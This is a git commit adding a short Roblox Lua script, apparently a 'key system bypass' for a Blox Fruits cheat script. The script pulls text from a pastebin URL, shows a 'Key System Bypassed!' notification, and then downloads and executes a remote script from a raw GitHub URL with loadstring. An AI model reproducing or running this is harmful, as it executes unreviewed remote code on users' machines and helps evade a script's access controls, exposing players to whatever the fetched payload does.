d4330e6be4782cecad2ad04c92bdd516ab39475d
Mr_Dark <76576010+DARK-02@users.noreply.github.com>
2023-02-13 12:08:17 +0700

    Create bf-dough-bypass.lua

---
+++ bf-dough-bypass.lua
@@ -0,0 +1,7 @@
+local e = game:HttpGet(('https://pastebin.com/raw/ep9drTdP'),true)
+game.StarterGui:SetCore("SendNotification", {
+Title = e;
+Text = "Key System Bypassed!";
+Duration = 60;
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/Hyper/main/script.lua"))()
